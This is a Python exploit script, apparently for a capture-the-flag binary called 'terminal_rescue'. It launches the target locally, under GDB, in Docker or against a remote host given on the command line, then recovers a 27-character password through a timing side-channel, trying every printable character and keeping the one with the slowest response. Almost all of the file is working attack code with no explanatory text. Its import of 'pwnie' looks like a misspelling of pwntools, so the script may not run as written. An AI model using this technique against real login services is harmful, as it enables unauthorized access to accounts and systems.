#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
import time 
import timeit

context.log_level = 'debug'
exe = context.binary = ELF('./terminal_rescue', checksec=False)
libc = exe.libc



def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw, env={'DEVELOPER_PASSWORD': 'mysecretpasswordlol'})
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw, env={'DEVELOPER_PASSWORD': 'mysecretpasswordlol'})

gdbscript = '''
brva 0x12CD
brva 0x11DD
c
'''.format(**locals())

p = start()

# ==================== EXPLOIT ====================

def measure_time(password):
    start_time = time.time()
    p.sendline(password)  
    p.recvline(timeout=0.1) 
    end_time = time.time()
    return end_time - start_time

def exploit():
    guessed_password = ""
    for i in range(27):
        best_char = None
        best_time = 0
        for char in string.printable:
            test_password = guessed_password + char
            elapsed_time = measure_time(test_password)
            if elapsed_time > best_time:
                best_time = elapsed_time
                best_char = char 
        guessed_password += best_char
        log.info(f'Guessed: {guessed_password}')

    print(f'Final guessed password: {guessed_password}')

if __name__ == '__main__':
    exploit()